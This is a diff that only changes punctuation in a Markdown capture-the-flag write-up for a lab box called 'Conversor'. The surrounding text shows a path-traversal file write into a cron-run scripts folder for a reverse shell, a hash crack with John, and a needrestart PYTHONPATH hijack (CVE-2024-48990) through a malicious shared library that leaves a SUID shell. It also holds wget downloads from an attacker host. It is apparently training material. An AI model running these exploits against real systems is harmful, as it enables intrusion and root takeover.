@@ -1,4 +1,4 @@
-# Conversor
+﻿# Conversor
 
 ## Box Info
 
@@ -19,8 +19,8 @@ nmap -sC -sV -oA nmap/conversor 10.129.238.31
 
 **Results:**
 
-- Port 22: SSH — OpenSSH on Ubuntu
-- Port 80: HTTP — Apache 2.4.52
+- Port 22: SSH  -  OpenSSH on Ubuntu
+- Port 80: HTTP  -  Apache 2.4.52
 
 ### Web Enumeration
 
@@ -31,7 +31,7 @@ Visiting port 80 takes you to a login/register page. After registering and loggi
 3. Transforms the XML using the XSLT and outputs an HTML file
 4. Serves the result at `/view/<file_id>`
 
-The About page links to a downloadable source code archive (`source_code.tar.gz`). **Always download source code when it's offered — it collapses your attack surface immediately.**
+The About page links to a downloadable source code archive (`source_code.tar.gz`). **Always download source code when it's offered  -  it collapses your attack surface immediately.**
 
 ---
 
@@ -54,7 +54,7 @@ xslt_file.save(xslt_path) # FILE SAVED BEFORE ANY VALIDATION
 try:
     parser = etree.XMLParser(resolve_entities=False, no_network=True, ...) # hardened
     xml_tree = etree.parse(xml_path, parser)
-    xslt_tree = etree.parse(xslt_path)  # DEFAULT parser — NO restrictions
+    xslt_tree = etree.parse(xslt_path)  # DEFAULT parser  -  NO restrictions
     transform = etree.XSLT(xslt_tree)
     result_tree = transform(xml_tree)
     result_html = str(result_tree)
@@ -65,9 +65,9 @@ except Exception as e:
 
 **Two distinct vulnerabilities are visible here:**
 
-**Vulnerability 1 — Path Traversal via `os.path.join`:** `os.path.join(UPLOAD_FOLDER, xml_file.filename)` has a known Python gotcha: if the second argument starts with `/`, it **discards everything before it** and treats it as an absolute path. No sanitisation on the filename means you control where files are written on the filesystem.
+**Vulnerability 1  -  Path Traversal via `os.path.join`:** `os.path.join(UPLOAD_FOLDER, xml_file.filename)` has a known Python gotcha: if the second argument starts with `/`, it **discards everything before it** and treats it as an absolute path. No sanitisation on the filename means you control where files are written on the filesystem.
 
-**Vulnerability 2 — XSLT parsed with unprotected parser:** The XML is parsed with a hardened parser (`resolve_entities=False`, `no_network=True`). The XSLT is parsed with `etree.parse(xslt_path)` — completely default, no restrictions. This means whatever XSLT you upload, lxml will execute faithfully.
+**Vulnerability 2  -  XSLT parsed with unprotected parser:** The XML is parsed with a hardened parser (`resolve_entities=False`, `no_network=True`). The XSLT is parsed with `etree.parse(xslt_path)`  -  completely default, no restrictions. This means whatever XSLT you upload, lxml will execute faithfully.
 
 **Hardcoded paths found:**
 
@@ -87,7 +87,7 @@ Every minute, `www-data` runs every `.py` file in the scripts directory. This is
 
 ---
 
-## Exploitation — Initial Foothold
+## Exploitation  -  Initial Foothold
 
 ### The Plan
 
@@ -103,7 +103,7 @@ The server validates that uploaded files are parseable XML/XSLT **after** saving
 save file to disk → try to parse → exception thrown → return error message
 ```
 
-The exception fires and returns `"Error: Start tag expected..."` but **the file is already on disk**. The cron job doesn't care about the app's exception — it just runs whatever `.py` files it finds.
+The exception fires and returns `"Error: Start tag expected..."` but **the file is already on disk**. The cron job doesn't care about the app's exception  -  it just runs whatever `.py` files it finds.
 
 ### Steps
 
@@ -141,7 +141,7 @@ Content-Type: text/plain
 # Replace file content with the reverse shell Python code
 ```
 
-**5. Forward the request.** The app will return an XML parse error — ignore it. The file is already written.
+**5. Forward the request.** The app will return an XML parse error  -  ignore it. The file is already written.
 
 **6. Wait up to 60 seconds for the cron to fire.**
 
@@ -173,7 +173,7 @@ Output contains:
 fismathack5b5c3ac3a1c897c94caad48e6c71fdec
 ```
 
-This is an MD5 hash (32 hex chars, no salt — classic unsalted MD5).
+This is an MD5 hash (32 hex chars, no salt  -  classic unsalted MD5).
 
 ### Crack with John
 
@@ -195,7 +195,7 @@ User flag: `/home/fismathack/user.txt`
 
 ---
 
-## Privilege Escalation — fismathack → root
+## Privilege Escalation  -  fismathack → root
 
 See Also: [[Linux-Privilege-Escalation]] | [[GTFOBins]]
 
@@ -220,9 +220,9 @@ needrestart -V
 
 ### What is needrestart?
 
-`needrestart` is a utility that checks whether running services or processes need to be restarted after library upgrades. When it runs, it **spawns Python** internally to inspect running processes. This is the key — if we can control what Python loads, we get code execution as root.
+`needrestart` is a utility that checks whether running services or processes need to be restarted after library upgrades. When it runs, it **spawns Python** internally to inspect running processes. This is the key  -  if we can control what Python loads, we get code execution as root.
 
-### CVE-2024-48990 — needrestart PYTHONPATH Hijack
+### CVE-2024-48990  -  needrestart PYTHONPATH Hijack
 
 **The vulnerability:** needrestart reads the environment of running processes from `/proc/<pid>/environ` to determine what libraries they're using. When it finds a Python process, it **inherits that process's PYTHONPATH** when spawning its own Python interpreter. This means you can poison the PYTHONPATH of a running process you own, and needrestart will use it when running as root.
 
@@ -232,7 +232,7 @@ needrestart -V
 
 The exploit has three components:
 
-**`lib.c` — malicious shared library (compiled as `importlib/__init__.so`):**
+**`lib.c`  -  malicious shared library (compiled as `importlib/__init__.so`):**
 
 ```c
 #include <stdio.h>
@@ -249,11 +249,11 @@ void a() {
 }
 ```
 
-The `__attribute__((constructor))` tells the compiler to run this function automatically when the shared library is loaded — before any other code. When needrestart's Python loads `importlib` and gets your `.so` instead, this fires immediately as root, copying `/bin/sh` to `/tmp/exploit/poc` with the SUID bit set.
+The `__attribute__((constructor))` tells the compiler to run this function automatically when the shared library is loaded  -  before any other code. When needrestart's Python loads `importlib` and gets your `.so` instead, this fires immediately as root, copying `/bin/sh` to `/tmp/exploit/poc` with the SUID bit set.
 
 **Why `importlib` specifically?** Because needrestart imports it internally. By naming your malicious directory `importlib` and putting it in PYTHONPATH before the real Python library paths, Python loads yours first. It's a classic Python import hijack.
 
-**`e.py` — watches for the SUID binary to appear:**
+**`e.py`  -  watches for the SUID binary to appear:**
 
 ```python
 import os
@@ -288,11 +288,11 @@ When you run `PYTHONPATH="$PWD" python3 e.py`, your current Python session also 
 ImportError: dynamic module does not define module export function (PyInit_importlib)
 ```
 
-This is expected and harmless — `e.py` only uses `os` and `time`, not `importlib`. The important thing is that the background Python process has the poisoned environment for needrestart to read.
+This is expected and harmless  -  `e.py` only uses `os` and `time`, not `importlib`. The important thing is that the background Python process has the poisoned environment for needrestart to read.
 
 ### Execution Steps
 
-**On Kali — compile the shared library:**
+**On Kali  -  compile the shared library:**
 
 ```bash
 mkdir -p importlib
@@ -300,7 +300,7 @@ gcc -shared -fPIC -o importlib/__init__.so lib.c
 python3 -m http.server 8080
 ```
 
-**On target — transfer and execute:**
+**On target  -  transfer and execute:**
 
 ```bash
 mkdir -p /tmp/exploit/importlib
@@ -311,7 +311,7 @@ wget http://YOUR_KALI_IP:8080/e.py
 # Run the watcher with poisoned PYTHONPATH in background
 PYTHONPATH="$PWD" python3 e.py &
 
-# Trigger needrestart as root — it will inspect running processes,
+# Trigger needrestart as root  -  it will inspect running processes,
 # find your Python process with PYTHONPATH set, and inherit it
 sudo needrestart
 ```
@@ -364,9 +364,9 @@ SUID /bin/sh copy → root flag
 ## Key Learnings
 
 - **`os.path.join` path traversal**: If the second argument starts with `/`, the base path is discarded entirely. Always a red flag when filenames go directly into `os.path.join` without sanitisation.
-- **File saves before validation**: The save happens outside the try/except. An error during parsing doesn't undo the write. Error messages lie — always check whether the operation actually failed or just reported failure.
+- **File saves before validation**: The save happens outside the try/except. An error during parsing doesn't undo the write. Error messages lie  -  always check whether the operation actually failed or just reported failure.
 - **Source code is gold**: The cron job, DB path, and both vulnerabilities were all visible before touching the box.
-- **CVE-2024-48990**: needrestart inherits PYTHONPATH from processes it inspects via `/proc/<pid>/environ`. `env_reset` in sudoers only affects the direct sudo invocation — it doesn't sanitise what needrestart reads from other processes.
+- **CVE-2024-48990**: needrestart inherits PYTHONPATH from processes it inspects via `/proc/<pid>/environ`. `env_reset` in sudoers only affects the direct sudo invocation  -  it doesn't sanitise what needrestart reads from other processes.
 - **SUID + `-p`**: SUID binaries running as root still need `-p` flag to prevent privilege dropping in modern shells.
 - **Unsalted MD5**: Still common in old/lazy code. Instantly crackable with rockyou.
 
